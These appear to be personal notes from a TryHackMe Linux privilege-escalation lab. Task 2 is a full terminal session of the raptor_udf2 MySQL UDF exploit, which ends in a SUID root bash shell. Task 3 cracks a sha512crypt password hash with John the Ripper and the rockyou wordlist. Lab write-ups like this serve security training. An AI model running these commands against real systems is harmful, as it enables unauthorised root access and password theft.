Linux PrivEsc

#Task 2
'''
user@debian:~$ cd /home/user/tools/mysql-udf                                                                                                                                                                                                                                                                               
user@debian:~/tools/mysql-udf$ ls -ltr                                                                                                                                                                                                                                                                                     
total 4                                                                                                                                                                                                                                                                                                                    
-rw-r--r-- 1 user user 3378 May 15 05:55 raptor_udf2.c                                                                                                                                                                                                                                                                     
user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC                                                                                                                                                                                                                                                               
user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc                                                                                                                                                                                                               
user@debian:~/tools/mysql-udf$ mysql -u root                                                                                                                                                                                                                                                                               
Welcome to the MySQL monitor.  Commands end with ; or \g.                                                                                                                                                                                                                                                                  
Your MySQL connection id is 35                                                                                                                                                                                                                                                                                             
Server version: 5.1.73-1+deb6u1 (Debian)                                                                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                                                                                                           
Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                                                           
Oracle is a registered trademark of Oracle Corporation and/or its                                                                                                                                                                                                                                                          
affiliates. Other names may be trademarks of their respective                                                                                                                                                                                                                                                              
owners.                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                           
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                                                           
mysql> use mysql;                                                                                                                                                                                                                                                                                                          
Reading table information for completion of table and column names                                                                                                                                                                                                                                                         
You can turn off this feature to get a quicker startup with -A                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                                                           
Database changed                                                                                                                                                                                                                                                                                                           
mysql> create table foo(line blob);                                                                                                                                                                                                                                                                                        
Query OK, 0 rows affected (0.01 sec)                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                           
mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));                                                                                                                                                                                                                                     
Query OK, 1 row affected (0.00 sec)                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                           
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';                                                                                                                                                                                                                                             
Query OK, 1 row affected (0.01 sec)                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                           
mysql> create function do_system returns integer soname 'raptor_udf2.so';                                                                                                                                                                                                                                                  
Query OK, 0 rows affected (0.00 sec)                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                           
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> exit
Bye
user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
rootbash-4.1# 
'''

# Task 3
kali@franka:~/Desktop/Tryhackme/linux-priv-esc$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2020-08-12 21:45) 2.941g/s 4517p/s 4517c/s 4517C/s kucing..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

